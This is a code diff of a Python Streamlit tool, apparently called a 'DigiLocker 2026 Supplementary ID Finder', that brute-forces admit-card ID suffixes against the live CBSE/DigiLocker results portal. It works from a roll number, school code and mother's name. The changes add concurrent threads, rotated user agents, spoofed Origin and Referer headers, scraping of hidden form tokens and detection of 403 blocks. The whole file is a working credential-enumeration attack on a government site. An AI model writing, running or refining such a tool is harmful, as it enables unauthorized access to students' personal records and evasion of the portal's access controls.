@@ -7,9 +7,9 @@ import time
 import random
 from concurrent.futures import ThreadPoolExecutor
 
-st.set_page_config(page_title="CBSE Engine", page_icon="📝")
+st.set_page_config(page_title="DigiLocker CBSE Engine", page_icon="📝")
 
-st.title("CBSE 2026 ID Finder")
+st.title("DigiLocker 2026 Supplementary ID Finder")
 st.caption("Made by Legionnaire")
 
 st.divider()
@@ -19,31 +19,29 @@ st.info("Notice: School Code and Admit Card Suffix need not be changed if you ar
 
 # --- Main Page Inputs (Mobile First Layout) ---
 st.subheader("Target Parameters")
-col1, col2, col3 = st.columns(3)
-
+col1, col2 = st.columns(2)
 with col1:
     roll_no = st.text_input("Roll Number", value="18602421")
+    school_code = st.text_input("School Number", value="45498")
 with col2:
-    school_code = st.text_input("School Code", value="45498")
-with col3:
+    mothers_name = st.text_input("Mother's Name (as per admit card)", value="").strip()
     fixed_suffix = st.text_input("Admit Card Suffix", value="4510")
 
 st.subheader("Execution Settings")
-col4, col5 = st.columns(2)
-
-with col4:
-    # Concurrency restricted to 1 - 5 range
+col3, col4 = st.columns(2)
+with col3:
     threads = st.slider("Threads (Concurrency):", 1, 5, 3)
-with col5:
-    # Initialized to 'A' as it starts with 1-letter entries
+with col4:
     start_combo = st.text_input("Start From:", value="A").upper()
 
-base_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii26.htm"
-post_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"
+# Target DigiLocker Portal Endpoints
+base_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.html"
+default_post_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.asp"
 
 UA_POOL = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
 ]
 
 def check_id_sync(combo):
@@ -52,6 +50,7 @@ def check_id_sync(combo):
     session.headers.update({
         'User-Agent': random.choice(UA_POOL),
         'Referer': base_url,
+        'Origin': 'https://results.digilocker.gov.in',
         'Connection': 'close'
     })
     
@@ -59,32 +58,53 @@ def check_id_sync(combo):
         r_init = session.get(base_url, timeout=7)
         soup = BeautifulSoup(r_init.text, 'html.parser')
         
-        payload = {'regno': roll_no, 'sch': school_code, 'admid': admit_id}
+        # Dynamically grab the form action if specified
+        form_tag = soup.find('form')
+        target_post = default_post_url
+        if form_tag and form_tag.get('action'):
+            act = form_tag.get('action')
+            if act.startswith('http'):
+                target_post = act
+            else:
+                target_post = f"https://results.digilocker.gov.in/{act.lstrip('/')}"
+
+        # Standard field mapping matching the DigiLocker page inputs
+        payload = {
+            'regno': roll_no,
+            'sch': school_code,
+            'admid': admit_id,
+            'mname': mothers_name,
+            'terms': 'on',
+            'B2': 'Submit'
+        }
+        
+        # Include any hidden inputs / tokens present in the page
         for h in soup.find_all('input', type='hidden'):
-            payload[h.get('name')] = h.get('value', '')
-        payload['B2'] = 'Submit'
+            if h.get('name'):
+                payload[h.get('name')] = h.get('value', '')
 
         time.sleep(random.uniform(0.1, 0.2))
-        response = session.post(post_url, data=payload, timeout=7)
+        response = session.post(target_post, data=payload, timeout=7)
         
-        if "Roll No" in response.text and "Invalid" not in response.text:
+        if ("Roll No" in response.text or "Candidate Name" in response.text or "Total Marks" in response.text) and "Invalid" not in response.text:
             return "SUCCESS", (admit_id, response.text)
-        if "Access Denied" in response.text:
+        if "Access Denied" in response.text or response.status_code == 403:
             return "BLOCKED", combo
     except:
         pass
     return "FAIL", combo
 
 def run_scan():
+    if not mothers_name:
+        st.warning("Please enter Mother's Name before starting the scan.")
+        return
+
     vowels = ['A', 'E', 'I', 'O', 'U']
     chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
         
-    # Generate 1-letter options first
     combos_1 = ["".join(c) for c in itertools.product(chars, repeat=1)]
-    # Generate 2-letter options second
     combos_2 = ["".join(c) for c in itertools.product(chars, repeat=2)]
     
-    # Combine sequences sequentially (Pure A-Z alphabet only)
     all_combos = combos_1 + combos_2
     
     try:
